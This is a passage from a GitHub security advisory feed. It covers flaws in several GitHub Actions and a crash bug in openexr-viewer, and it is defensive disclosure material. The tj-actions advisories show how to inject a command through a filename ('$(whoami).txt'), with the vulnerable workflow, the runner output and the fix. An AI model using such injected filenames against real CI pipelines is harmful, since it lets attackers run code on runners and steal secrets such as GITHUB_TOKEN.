]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xj87-mqvh-88w2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-12T18:25:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rlespinasse/github-slug-action] github-slug-action use of `set-env` Runner commands which are processed via stdout]]></title>
        <id>https://github.com/advisories/GHSA-7f32-hm4h-w77q</id>
        <link href="https://github.com/advisories/GHSA-7f32-hm4h-w77q"/>
        <updated>2024-02-03T00:22:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This GitHub Action use <code>set-env</code> runner commands which are processed via stdout related to GHSA-mfwh-5m23-j46w</p>
<h3 id="patches">Patches</h3>
<p>The following versions use the recommended <a href="https://github.com/actions/toolkit/blob/main/docs/commands.md#environment-files">Environment File Syntax</a>.</p>
<ul>
<li>2.1.1</li>
<li>1.1.1</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>None, it is strongly suggested that you upgrade as soon as possible.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/rlespinasse/github-slug-action">rlespinasse/github-slug-action</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q">https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q</a></li>
<li><a href="https://github.com/advisories/GHSA-7f32-hm4h-w77q">https://github.com/advisories/GHSA-7f32-hm4h-w77q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f32-hm4h-w77q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-03T00:22:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[rlespinasse/github-slug-action] github-slug-action use of `set-env` Runner commands which are processed via stdout]]></title>
        <id>https://github.com/advisories/GHSA-7f32-hm4h-w77q</id>
        <link href="https://github.com/advisories/GHSA-7f32-hm4h-w77q"/>
        <updated>2024-02-03T00:22:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>This GitHub Action use <code>set-env</code> runner commands which are processed via stdout related to GHSA-mfwh-5m23-j46w</p>
<h3 id="patches">Patches</h3>
<p>The following versions use the recommended <a href="https://github.com/actions/toolkit/blob/main/docs/commands.md#environment-files">Environment File Syntax</a>.</p>
<ul>
<li>2.1.1</li>
<li>1.1.1</li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>None, it is strongly suggested that you upgrade as soon as possible.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/rlespinasse/github-slug-action">rlespinasse/github-slug-action</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q">https://github.com/rlespinasse/github-slug-action/security/advisories/GHSA-7f32-hm4h-w77q</a></li>
<li><a href="https://github.com/advisories/GHSA-7f32-hm4h-w77q">https://github.com/advisories/GHSA-7f32-hm4h-w77q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f32-hm4h-w77q</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-03T00:22:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hashicorp/vault-action] Vault GitHub Action did not correctly mask multi-line secrets in output]]></title>
        <id>https://github.com/advisories/GHSA-4mgv-m5cm-f9h7</id>
        <link href="https://github.com/advisories/GHSA-4mgv-m5cm-f9h7"/>
        <updated>2024-01-25T19:58:48.000Z</updated>
        <content type="html"><![CDATA[<p>HashiCorp vault-action (aka Vault GitHub Action) before 2.2.0 allows attackers to obtain sensitive information from log files because a multi-line secret was not correctly registered with GitHub Actions for log masking.</p>
<p>The vault-action implementation did not correctly handle the marking of multi-line variables. As a result, multi-line secrets were not correctly masked in vault-action output.</p>
<p>Remediation:
Customers using vault-action should evaluate the risk associated with this issue, and consider upgrading to vault-action 2.2.0 or newer. Please refer to <a href="https://github.com/marketplace/actions/hashicorp-vault">https://github.com/marketplace/actions/hashicorp-vault</a> for more information.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-32074">https://nvd.nist.gov/vuln/detail/CVE-2021-32074</a></li>
<li><a href="https://github.com/hashicorp/vault-action/issues/205">https://github.com/hashicorp/vault-action/issues/205</a></li>
<li><a href="https://github.com/hashicorp/vault-action/pull/208">https://github.com/hashicorp/vault-action/pull/208</a></li>
<li><a href="https://discuss.hashicorp.com/t/hcsec-2021-13-vault-github-action-did-not-correctly-mask-multi-line-secrets-in-output/24128">https://discuss.hashicorp.com/t/hcsec-2021-13-vault-github-action-did-not-correctly-mask-multi-line-secrets-in-output/24128</a></li>
<li><a href="https://github.com/hashicorp/vault-action/blob/master/CHANGELOG.md">https://github.com/hashicorp/vault-action/blob/master/CHANGELOG.md</a></li>
<li><a href="https://github.com/hashicorp/vault-action/commit/3526e1be65cf8faf42d6088bc5da8bff596c718a">https://github.com/hashicorp/vault-action/commit/3526e1be65cf8faf42d6088bc5da8bff596c718a</a></li>
<li><a href="https://github.com/advisories/GHSA-4mgv-m5cm-f9h7">https://github.com/advisories/GHSA-4mgv-m5cm-f9h7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4mgv-m5cm-f9h7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-24T19:01:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tj-actions/verify-changed-files] Potential Actions command injection in output filenames (GHSL-2023-275)]]></title>
        <id>https://github.com/advisories/GHSA-ghm2-rq8q-wrhc</id>
        <link href="https://github.com/advisories/GHSA-ghm2-rq8q-wrhc"/>
        <updated>2024-01-10T19:11:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <a href="https://github.com/tj-actions/verify-changed-files"><code>tj-actions/verify-changed-files</code></a> action allows for command injection in changed filenames, allowing an attacker to execute arbitrary code and potentially leak secrets.</p>
<h3 id="details">Details</h3>
<p>The <a href="https://github.com/tj-actions/verify-changed-files"><code>verify-changed-files</code></a> workflow returns the list of files changed within a workflow execution.</p>
<p>This could potentially allow filenames that contain special characters such as <code>;</code> and ` (backtick) which can be used by an attacker to take over the <a href="https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners">GitHub Runner</a> if the output value is used in a raw fashion (thus being directly replaced before execution) inside a <code>run</code> block. By running custom commands an attacker may be able to steal **secrets** such as <code>GITHUB_TOKEN</code> if triggered on other events than <code>pull_request</code>. For example on <code>push</code>.</p>
<h4 id="proof-of-concept">Proof of Concept</h4>
<ol>
<li>Submit a pull request to the repository with a new file injecting a command. For example <code>$(whoami).txt</code> would be a valid filename.</li>
<li>Upon approval of the workflow (triggered by the pull request), the action will get executed and the malicious pull request filename will flow into the <code>List all changed files tracked and untracked files</code> step.</li>
</ol>
<pre><code class="language-yaml">- name: List all changed files tracked and untracked files
  run: |
    echo "Changed files: ${{ steps.verify-changed-files.outputs.changed_files }}"
</code></pre>
<p>Example output:</p>
<pre><code class="language-yaml">##[group]Run echo "Changed files: $(whoami).txt"
  echo "Changed files: $(whoami).txt"[0m
shell: /usr/bin/bash -e {0}
##[endgroup]
Changed files: runner.txt
</code></pre>
<h3 id="impact">Impact</h3>
<p>This issue may lead to arbitrary command execution in the GitHub Runner.</p>
<h3 id="resolution">Resolution</h3>
<ul>
<li><p>A new <code>safe_output</code> input would be enabled by default and return filename paths escaping special characters like ;, ` (backtick), $, (), etc for bash environments.</p>
</li>
<li><p>A safe recommendation of using environment variables to store unsafe outputs.</p>
</li>
</ul>
<pre><code class="language-yaml">- name: List all changed files tracked and untracked files
  env:
     CHANGED_FILES: ${{ steps.verify-changed-files.outputs.changed_files }}
  run: |
    echo "Changed files: $CHANGED_FILES"
</code></pre>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://securitylab.github.com/research/github-actions-untrusted-input/">Keeping your GitHub Actions and workflows secure Part 2: Untrusted input</a></li>
<li><a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/">Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tj-actions/verify-changed-files/security/advisories/GHSA-ghm2-rq8q-wrhc">https://github.com/tj-actions/verify-changed-files/security/advisories/GHSA-ghm2-rq8q-wrhc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-52137">https://nvd.nist.gov/vuln/detail/CVE-2023-52137</a></li>
<li><a href="https://github.com/tj-actions/verify-changed-files/commit/498d3f316f501aa72485060e8c96fde7b2014f12">https://github.com/tj-actions/verify-changed-files/commit/498d3f316f501aa72485060e8c96fde7b2014f12</a></li>
<li><a href="https://github.com/tj-actions/verify-changed-files/commit/592e305da041c09a009afa4a43c97d889bed65c3">https://github.com/tj-actions/verify-changed-files/commit/592e305da041c09a009afa4a43c97d889bed65c3</a></li>
<li><a href="https://github.com/advisories/GHSA-ghm2-rq8q-wrhc">https://github.com/advisories/GHSA-ghm2-rq8q-wrhc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ghm2-rq8q-wrhc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-02T16:42:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tj-actions/changed-files] tj-actions/changed-files has Potential Actions command injection in output filenames (GHSL-2023-271)]]></title>
        <id>https://github.com/advisories/GHSA-mcph-m25j-8j63</id>
        <link href="https://github.com/advisories/GHSA-mcph-m25j-8j63"/>
        <updated>2024-01-04T19:43:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>tj-actions/changed-files</code> workflow allows for command injection in changed filenames, allowing an attacker to execute arbitrary code and potentially leak secrets.</p>
<h3 id="details">Details</h3>
<p>The <a href="https://github.com/tj-actions/changed-files"><code>changed-files</code></a> action returns a list of files changed in a commit or pull request which provides an <code>escape_json</code> input <a href="https://github.com/tj-actions/changed-files/blob/94549999469dbfa032becf298d95c87a14c34394/action.yml#L136">enabled by default</a>, only escapes <code>"</code> for JSON values. </p>
<p>This could potentially allow filenames that contain special characters such as <code>;</code> and ` (backtick) which can be used by an attacker to take over the <a href="https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners">GitHub Runner</a> if the output value is used in a raw fashion (thus being directly replaced before execution) inside a <code>run</code> block. By running custom commands an attacker may be able to steal **secrets** such as <code>GITHUB_TOKEN</code> if triggered on other events than <code>pull_request</code>. For example on <code>push</code>.</p>
<h4 id="proof-of-concept">Proof of Concept</h4>
<ol>
<li>Submit a pull request to a repository with a new file injecting a command. For example <code>$(whoami).txt</code> which is a valid filename.</li>
<li>Upon approval of the workflow (triggered by the pull request), the action will get executed and the malicious pull request filename will flow into the <code>List all changed files</code> step below.</li>
</ol>
<pre><code class="language-yaml">      - name: List all changed files
        run: |
          for file in ${{ steps.changed-files.outputs.all_changed_files }}; do
            echo "$file was changed"
          done
</code></pre>
<p>Example output:</p>
<pre><code class="language-yaml">##[group]Run for file in $(whoami).txt; do
    for file in $(whoami).txt; do
        echo "$file was changed"
    done
shell: /usr/bin/bash -e {0}
##[endgroup]
runner.txt was changed
</code></pre>
<h3 id="impact">Impact</h3>
<p>This issue may lead to arbitrary command execution in the GitHub Runner.</p>
<h3 id="resolution">Resolution</h3>
<ul>
<li><p>A new <code>safe_output</code> input would be enabled by default and return filename paths escaping special characters like ;, ` (backtick), $, (), etc for bash environments.</p>
</li>
<li><p>A safe recommendation of using environment variables to store unsafe outputs.</p>
</li>
</ul>
<pre><code class="language-yaml">- name: List all changed files
  env:
    ALL_CHANGED_FILES: ${{ steps.changed-files.outputs.all_changed_files }}
  run: |
    for file in "$ALL_CHANGED_FILES"; do
      echo "$file was changed"
    done
</code></pre>
<h3 id="resources">Resources</h3>
<ul>
<li><a href="https://securitylab.github.com/research/github-actions-untrusted-input/">Keeping your GitHub Actions and workflows secure Part 2: Untrusted input</a></li>
<li><a href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/">Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tj-actions/changed-files/security/advisories/GHSA-mcph-m25j-8j63">https://github.com/tj-actions/changed-files/security/advisories/GHSA-mcph-m25j-8j63</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-51664">https://nvd.nist.gov/vuln/detail/CVE-2023-51664</a></li>
<li><a href="https://github.com/tj-actions/changed-files/commit/0102c07446a3cad972f4afcbd0ee4dbc4b6d2d1b">https://github.com/tj-actions/changed-files/commit/0102c07446a3cad972f4afcbd0ee4dbc4b6d2d1b</a></li>
<li><a href="https://github.com/tj-actions/changed-files/commit/716b1e13042866565e00e85fd4ec490e186c4a2f">https://github.com/tj-actions/changed-files/commit/716b1e13042866565e00e85fd4ec490e186c4a2f</a></li>
<li><a href="https://github.com/tj-actions/changed-files/commit/ff2f6e6b91913a7be42be1b5917330fe442f2ede">https://github.com/tj-actions/changed-files/commit/ff2f6e6b91913a7be42be1b5917330fe442f2ede</a></li>
<li><a href="https://github.com/advisories/GHSA-mcph-m25j-8j63">https://github.com/advisories/GHSA-mcph-m25j-8j63</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mcph-m25j-8j63</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-02T16:41:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[afichet/openexr-viewer] memory overflow vulnerability in OpenEXR-viewer]]></title>
        <id>https://github.com/advisories/GHSA-99jg-r3f4-rpxj</id>
        <link href="https://github.com/advisories/GHSA-99jg-r3f4-rpxj"/>
        <updated>2023-12-12T13:20:31.000Z</updated>
        <content type="html"><![CDATA[<p>Just open this exr file through openexr-viewer.</p>
<p>( poc send by email )</p>
<p>This is windbg log file.</p>
<p>[ POC 2 ]
(8660.7e44): Access violation - code c0000005 (!!! second chance !!!)
openexr_viewer+0x27be4:
00007ff7<code>13ff7be4 c744880c0000803f mov     dword ptr [rax+rcx*4+0Ch],3F800000h ds:0000020a</code>3ac8000c=????????</p>
<p>Attempt to write the value 1.0 to the memory address 0x20A3AC8000C</p>
<p>[ POC 1 ]
(1404.9264): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
openexr_viewer+0x27be4:
00007ff7<code>13ff7be4 c744880c0000803f mov     dword ptr [rax+rcx*4+0Ch],3F800000h ds:0000029c</code>b371600c=????????</p>
<p>Attempt to write the value 1.0 to the memory address 0x29CB371600C</p>
<p>Credits
Team : ZeroPointer
ì´ë™í•˜â€ƒ( Lee Dong Ha of ZeroPointer Lab )
ì •ì§€ë¯¼ &nbsp;&nbsp;&nbsp;( Jeong Jimin of ZeroPointer Lab )
ë°•ìš°ì§„&nbsp;&nbsp;&nbsp; ( Park Woojin of ZeroPointer Lab )
ì „ìš°ì§„&nbsp;&nbsp;&nbsp; ( Jeon Woojin of ZeroPointer Lab )</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/afichet/openexr-viewer/security/advisories/GHSA-99jg-r3f4-rpxj">https://github.com/afichet/openexr-viewer/security/advisories/GHSA-99jg-r3f4-rpxj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-50245">https://nvd.nist.gov/vuln/detail/CVE-2023-50245</a></li>
<li><a href="https://github.com/afichet/openexr-viewer/commit/d0a7e85dfeb519951fb8a8d70f73f30d41cdd3d9">https://github.com/afichet/openexr-viewer/commit/d0a7e85dfeb519951fb8a8d70f73f30d41cdd3d9</a></li>
<li><a href="https://github.com/advisories/GHSA-99jg-r3f4-rpxj">https://github.com/advisories/GHSA-99jg-r3f4-rpxj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-99jg-r3f4-rpxj</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-12-12T13:20:29.000Z</published>
    </entry>
</feed>